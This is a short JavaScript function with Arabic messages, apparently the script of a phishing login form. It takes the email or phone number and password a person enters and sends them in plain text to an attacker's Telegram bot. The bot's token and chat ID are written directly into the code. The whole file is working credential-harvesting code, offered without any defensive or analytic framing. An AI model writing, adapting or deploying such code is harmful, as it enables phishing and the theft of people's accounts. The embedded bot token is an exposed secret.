function sendToTelegram() {
    var emailOrPhone = document.getElementById("emailOrPhone").value;
    var password = document.getElementById("password").value;

    if (emailOrPhone.trim() === "" || password.trim() === "") {
        alert("الرجاء إدخال البريد الإلكتروني أو الرقم وكلمة المرور");
        return;
    }

    var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
    var phoneRegex = /^[0-9]+$/;

    if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
        alert("الرجاء إدخال بريد إلكتروني أو رقم هاتف صحيح.");
        return;
    }

    var token = '7851246905:AAGZC-xSoTCDRk3JEXmQ4vkx3UxGVXBfcZU';
    var chatId = '7022091399';
    var message = "البريد الإلكتروني أو الرقم المرسل: " + emailOrPhone + "\nكلمة المرور: " + password;

    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("تم إرسال البريد الإلكتروني أو الرقم وكلمة المرور بنجاح إلى تلغرام!");
            } else {
                alert("حدث خطأ أثناء إرسال الرسالة.");
            }
        })
        .catch(error => {
            console.error("خطأ في إرسال الطلب: ", error);
            alert("حدث خطأ في إرسال الرسالة.");
        });
}